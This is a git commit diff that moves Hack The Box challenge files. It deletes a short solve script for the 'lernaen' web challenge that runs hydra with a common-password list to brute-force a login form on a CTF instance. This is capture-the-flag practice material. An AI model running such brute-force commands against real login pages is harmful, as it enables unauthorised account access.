64bcda1d1d8893c2ece308f82348755a2c62ca9e
florian <flrn.pjd@protonmail.com>
2022-07-30 13:11:34 +0200

    moved HTB challs to HTB repo

--- HTB-challs/web/lernaen/solve.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-hydra -l user -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt docker.hackthebox.eu -s 41036  http-post-form "/:password=^PASS^:Invalid" -t 64
-
-# inspect response in burp
